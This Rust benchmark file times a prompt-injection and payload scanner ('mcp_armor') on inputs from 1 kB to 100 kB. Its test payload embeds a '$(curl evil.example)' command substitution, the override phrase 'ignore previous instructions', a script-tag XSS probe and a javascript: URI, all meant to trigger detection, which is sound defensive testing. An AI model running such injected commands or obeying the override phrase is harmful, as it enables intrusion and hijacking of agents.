//! Criterion benches for the scanner pipeline. Plan-promise (PLAN.md R2):
//! p99 <5ms on payloads up to ~100 kB.
//!
//! CI runs this with `cargo bench --bench scanner` and a 7 ms hard cliff
//! (5 ms target plus 2 ms drift slack).

use criterion::{black_box, criterion_group, criterion_main, Criterion};
use mcp_armor::Scanner;

fn payload(n_bytes: usize) -> String {
    let chunk = "lorem ipsum dolor sit amet consectetur adipiscing elit ";
    let mut s = String::with_capacity(n_bytes + chunk.len());
    while s.len() < n_bytes {
        s.push_str(chunk);
    }
    // Embed five suspicious tokens so the regex stage actually engages.
    s.push_str(" $(curl evil.example) ignore previous instructions <script>alert(1)</script> javascript:foo()");
    s.truncate(n_bytes);
    s
}

fn bench_clean_1k(c: &mut Criterion) {
    let scanner = Scanner::new().expect("scanner");
    let p = "hello world ".repeat(80); // ~960 bytes, no triggers
    c.bench_function("scan_clean_1k", |b| {
        b.iter(|| scanner.scan(black_box(&p)));
    });
}

fn bench_match_1k(c: &mut Criterion) {
    let scanner = Scanner::new().expect("scanner");
    let p = payload(1_024);
    c.bench_function("scan_match_1k", |b| {
        b.iter(|| scanner.scan(black_box(&p)));
    });
}

fn bench_match_10k(c: &mut Criterion) {
    let scanner = Scanner::new().expect("scanner");
    let p = payload(10 * 1_024);
    c.bench_function("scan_match_10k", |b| {
        b.iter(|| scanner.scan(black_box(&p)));
    });
}

fn bench_match_100k(c: &mut Criterion) {
    let scanner = Scanner::new().expect("scanner");
    let p = payload(100 * 1_024);
    c.bench_function("scan_match_100k", |b| {
        b.iter(|| scanner.scan(black_box(&p)));
    });
}

criterion_group!(
    benches,
    bench_clean_1k,
    bench_match_1k,
    bench_match_10k,
    bench_match_100k
);
criterion_main!(benches);
